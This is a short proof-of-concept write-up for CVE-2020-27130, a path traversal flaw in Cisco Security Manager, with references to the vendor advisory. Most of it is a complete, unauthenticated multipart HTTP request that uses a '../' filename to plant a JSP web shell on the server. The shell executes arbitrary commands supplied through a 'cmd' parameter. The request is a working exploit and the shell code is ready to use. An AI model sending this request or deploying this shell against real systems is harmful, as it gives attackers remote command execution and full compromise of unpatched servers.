## Overview
CVE-2020-27130 allows attackers to download arbitrary files or folders (as zip files) or even upload JSP web shell to a Cisco Security Manager server. There are 6 endpoints that can be exploited without authenticating.

Basically, it is a Path Traversal vulnerability. So, dot-dot-slash or ("../") will appear in all malicious payloads.

## Proof of Concept
* Upload web shell
```
POST /cwhp/XmpFileUploadServlet HTTP/1.1
Host: example.com
Content-Length: 952
Content-Type: multipart/form-data; boundary=------------------------704676f0a0c66115

--------------------------704676f0a0c66115
Content-Disposition: form-data; name="data"; filename="../../MDC/tomcat/webapps/cwhp/shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " + request.getParameter("cmd") + "<BR>");
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</pre>
</BODY></HTML>

--------------------------704676f0a0c66115--
```

## References
* https://gist.github.com/Frycos/8bf5c125d720b3504b4f28a1126e509e
* https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-csm-path-trav-NgeRnqgR